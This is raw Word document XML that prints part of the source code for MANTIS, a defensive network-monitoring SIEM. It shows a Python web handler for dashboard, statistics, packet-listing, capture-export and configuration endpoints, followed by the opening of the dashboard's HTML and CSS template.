      </w:r>
    </w:p>
    <w:p w14:paraId="74E49CE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self.end_headers()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016452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self.wfile.write(body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00CF89C1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34E451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log_message(self, fmt, *args):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="360B53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pass  # silence per-request HTTP logging (keeps the console clean)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B9005E5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F3F0BF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do_GET(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BBD50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route = urlparse(self.path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E871D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path = route.path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="306522F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params = parse_qs(route.query)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32FA864A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FFE9FB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path == '/':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76414F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body = self._get_dashboard_html().encode('utf-8')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="428821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self.send_response(200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B81EF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self.send_header('Content-type', 'text/html; charset=utf-8')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E102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self.send_header('Content-Length', str(len(body)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D20FB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self.end_headers()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="056FFA7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self.wfile.write(body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E8941A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C86805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elif path == '/api/stats':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF73E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now = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1B64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active_count = sum(1 for t in ACTIVE_SENSORS.values() if now - t &lt; 60)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BEC7BFC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A5D76F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ddos_count = sum(1 for a in ALERT_HISTORY if "DDoS" in a["message"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EA8FA4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scan_count = sum(1 for a in ALERT_HISTORY if "SCAN" in a["message"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23956F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payload_count = sum(1 for a in ALERT_HISTORY if "PAYLOAD" in a["message"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36DE6E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blacklist_count = sum(1 for a in ALERT_HISTORY if "BLACKLIST" in a["message"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E45AA51" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21A3AAE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traffic = packet_store.STORE.stats_snapshot()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EDF888E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00866B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ATT&amp;CK roll-up: which techniques were observed, and the highest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC3E0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risk score currently in the buffer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5892FC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technique_counts = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19FAEB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max_risk = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3798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a in ALERT_HISTORY:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D268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tid = a.get("technique_id")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF3343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tid and tid != "N/A":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00268F0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key = "%s %s" % (tid, a.get("technique", ""))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6249B4B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technique_counts[key] = technique_counts.get(key, 0) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40A7B5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7CEB5EA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max_risk = max(max_risk, float(a.get("risk_score") or 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C9BBE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(TypeError, ValueError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DE93D5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pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67E3665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top_techniques = sorted(technique_counts.items(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19DAA7E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key=lambda kv: kv[1], reverse=True)[:5]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7467D92D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F037D2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stats = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E4E09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"online_sensors": active_count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E87D24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"total_alerts": len(ALERT_HISTORY),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B9A98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"max_risk": round(max_risk, 1),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E1F4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"top_techniques": top_techniques,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B6CF5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"ddos_alerts": ddos_count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E1392D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"scan_alerts": scan_count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF4D2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"payload_alerts": payload_count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E4E22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"blacklist_alerts": blacklist_count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669046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"cpu_usage": read_cpu_percent(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E8B1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"mem_usage": read_mem_percent(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44FB13D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live traffic telemetry from the sensor's in-memory store</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F35FD2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"pps": traffic["pps"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="053E4C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"z_score": traffic["z_score"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42073B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"baseline": traffic["mean"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A7818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"ddos_candidate": traffic["ddos_candidate"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C4D1CA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"ddos_active": traffic["ddos_active"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="155223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"packets_buffered": traffic["buffered"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B21A7A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"packets_total": traffic["total_seen"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252A7C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"proto_counts": traffic["proto_counts"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E7CC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"top_talkers": packet_store.STORE.top_talkers(5),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CA23E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"alerts": list(ALERT_HISTORY),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7752803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30DDF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self._send_json(stats)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="364DA8E2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C54C1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elif path == '/api/packets':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A966F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limit = int(params.get("limit", ["200"])[0])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3836B1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after = int(params.get("after", ["0"])[0])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254777F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proto = params.get("proto", [None])[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D252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query = params.get("q", [None])[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC4A5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packets = packet_store.STORE.get_recent(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F1FDA5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limit=limit, proto=proto, query=query, after=after)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6407D4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self._send_json({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B6C785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"packets": packets,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B51844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"buffered": packet_store.STORE.stats_snapshot()["buffered"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714CC6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"total": packet_store.STORE.stats_snapshot()["total_seen"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="297472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358ACD3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BEB1A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elif path == '/api/export':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7558368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download the whole in-memory capture as a JSON "pcap-lite" file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="543158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data = json.dumps({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="041EDB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"exported_at": time.strftime("%Y-%m-%d %H:%M:%S"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EEA26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"packets": packet_store.STORE.all_packets(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67CCCE1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indent=2).encode('utf-8')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="370BFC7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self.send_response(200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E1111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self.send_header('Content-type', 'application/json')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="125A3BA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self.send_header('Content-Disposition',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AAE953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'attachment; filename="mantis_capture.json"')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A001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self.end_headers()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4362A7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self.wfile.write(data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACA8110" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05C616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elif path == '/api/export.pcap':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5A4EF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Serialise the in-memory ring buffer as a real libpcap file, so</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72936B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the captured frames can be verified independently in Wireshark</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA1923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or tcpdump rather than only through this dashboard.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D73E7E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records = packet_store.STORE.all_packets()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6295710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data = pcap.build_from_records(records)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A1DCB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self.send_response(200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04210C9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self.send_header('Content-type', 'application/vnd.tcpdump.pcap')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02EB988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self.send_header('Content-Disposition',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2348217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'attachment; filename="mantis_capture.pcap"')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21383C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self.send_header('Content-Length', str(len(data)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="058457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self.end_headers()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="410F93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self.wfile.write(data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D9CB77C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5037BE0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elif path == '/api/config':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0582E6C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expose the effective runtime policy so the operator can confirm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09DCCD1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whether active defence and privacy controls are actually on</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76B3DE6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self._send_json({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D686F2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"block_enabled": CONFIG.block_enabled,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A7D4C0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"block_on": CONFIG.block_on,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13DAF4E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"privacy_mode": CONFIG.privacy_mode,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F0F5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"anonymise_ips": CONFIG.anonymise_ips,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="240D4E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"payload_excerpt_bytes": CONFIG.payload_excerpt_bytes,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D930D5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"zscore_threshold": CONFIG.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D73AA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"zscore_window": CONFIG.zscore_window,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5961FA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"ddos_min_pps": CONFIG.ddos_min_pps,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EDE4FF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"ddos_consecutive_intervals":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51AEFFB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CONFIG.ddos_consecutive_intervals,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4193E2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"packet_buffer": CONFIG.packet_buffer,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6175455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"pcap_file": CONFIG.pcap_file,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF2BB2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"blacklist_file": CONFIG.blacklist_file,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D02B41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BC49A91" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="706AAB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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="473D881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self.send_error(404)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E9A00AB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="151869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_get_dashboard_html(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="649BE0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import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AF12A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1. Get the path to this script</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2101D1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script_path = os.path.abspath(__file__)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DCB4B76" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B1ACF0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2. If it's a symlink (e.g. /usr/bin/mantis-siem), follow it to the real file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E85EF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os.path.islink(script_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="634B84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script_path = os.readlink(script_path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="631E3E01" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A3D9E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3. Get the directory containing the real siem.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48FB60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base_dir = os.path.dirname(script_path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EAE280E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A439C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4. Construct the path to the HTML template</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EE00D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template_path = os.path.join(base_dir, 'web_template.html')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74765662" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7ADCE99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07FAD0D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open(template_path, 'r', encoding='utf-8') as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C2A0FA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f.read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34A88F0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FileNotFoundError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4183F34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f"&lt;html&gt;&lt;body&gt;&lt;h1&gt;Error: web_template.html not found at {template_path}&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E19E986" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4320B2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start_siem():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="587F70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1. Start UDP Listener in Background Thread</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C152B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udp_server = SyslogUDPHandler(UDP_PORT)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="432904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udp_thread = threading.Thread(target=udp_server.start, daemon=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1794E87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udp_thread.start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A6CF35" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0868040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2. Start Web Server in Main Thread</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="196EC62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print(f"[*] Starting MANTIS SIEM Web Dashboard on http://localhost:{HTTP_PORT}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B5731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print(f"[*] Press Ctrl+C to stop.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510CB216" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F18DE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Custom TCP Server that allows immediate port reuse (fixes 'Address already in use')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="281A76D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class ReusableTCPServer(socketserver.TCPServer):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4DA4D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allow_reuse_address = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FBAAA2C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="271F257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httpd = ReusableTCPServer(("", HTTP_PORT), WebDashboardHandler)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70EC102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2B34998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httpd.serve_forever()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BF2EFD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KeyboardInterrupt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E8DBF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print("\n[!] Stopping Web Server.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D4C1F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httpd.server_close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C55BA67" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FDCB10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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="707F0D9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start_siem()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5539235C"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src/dashboard_ui/web_template.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0E619B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>1,946 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC3415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&lt;!DOCTYPE html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43AE6BC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&lt;html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15690AC8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79CF668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&lt;head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="249E55D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&lt;meta charset="utf-8"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6950D7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&lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D78745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&lt;meta name="description" content="MANTIS network security monitoring dashboard"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="711508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&lt;title&gt;MANTIS | Security Operations&lt;/title&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EFD75F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&lt;style&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA3FBE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@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;family=JetBrains+Mono:wght@400;500&amp;display=swap');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A044920" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41763A0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:root {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9DCE0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--bg-main: #0e0f15;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F4C8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--bg-nav: #161821;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30BF322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--bg-card: #1c1f2e;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F4B7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--bg-card-hover: #232738;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142F6F9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--text-main: #f0f2f5;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD94E3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--text-muted: #919bb0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D99B98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--accent-green: #0cd15b;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D6FDA3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--accent-blue: #3b82f6;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17127B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--accent-red: #ef4444;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B22F2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--accent-orange: #f59e0b;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46C20D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--accent-purple: #8b5cf6;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D8A2F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--border-color: #2a2e3f;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="593D88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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A6CBB5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21E1B50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body {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE977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font-family: 'Inter', sans-serif;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="198AD97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var(--bg-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC58C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var(--text-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BBBA8F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 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="694D58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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5739D7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height: 100vh;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="611E84C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overflow: hidden;</w:t>
      </w:r>
    </w:p>
